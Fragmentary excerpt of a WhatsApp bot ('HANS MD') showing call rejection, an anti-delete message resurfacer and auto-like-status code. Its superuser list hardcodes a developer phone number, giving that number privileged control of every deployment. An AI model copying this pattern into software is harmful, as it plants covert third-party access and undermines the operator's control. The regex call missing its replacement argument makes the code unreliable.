    ...
    zk.ev.on("call", async callData => {
      if (conf.ANTICALL === 'yes') {
        ...
        await zk.sendMessage(callerId, {
          text: "```❗⚠️I AM HANS MD | I REJECT THIS CALL BECAUSE MY OWNER IS BUSY.KINDLY SEND TEXT INSTEAD``` ."
        });
      }
    });
...
function createNotification(deletedMessage) {
  ...
  let notification = `*⚠️HANS ANTIDELETE⚠️*\n\n`;
...
if (conf.AUTO_LIKE_STATUS === "yes") {
    ...
    zk.ev.on("messages.upsert", async m => {
      ...
      const superUserNumbers = [servBot, "255756530143", '255756530143', '255756530143', "255756530143", '255756530143', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
      const allAllowedNumbers = superUserNumbers.concat(sudo);
      const superUser = allAllowedNumbers.includes(auteurMessage);
      var dev = ['255756530143', '255756530143', "255756530143", '255756530143'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
...
╰═════════════════⊷
 `
        ...
        if (raisonDeconnexion === baileys_1.DisconnectReason.badSession) {
          ...
          console.log('connection error😞 ,,HansTz trying to reconnect... ');
          main();
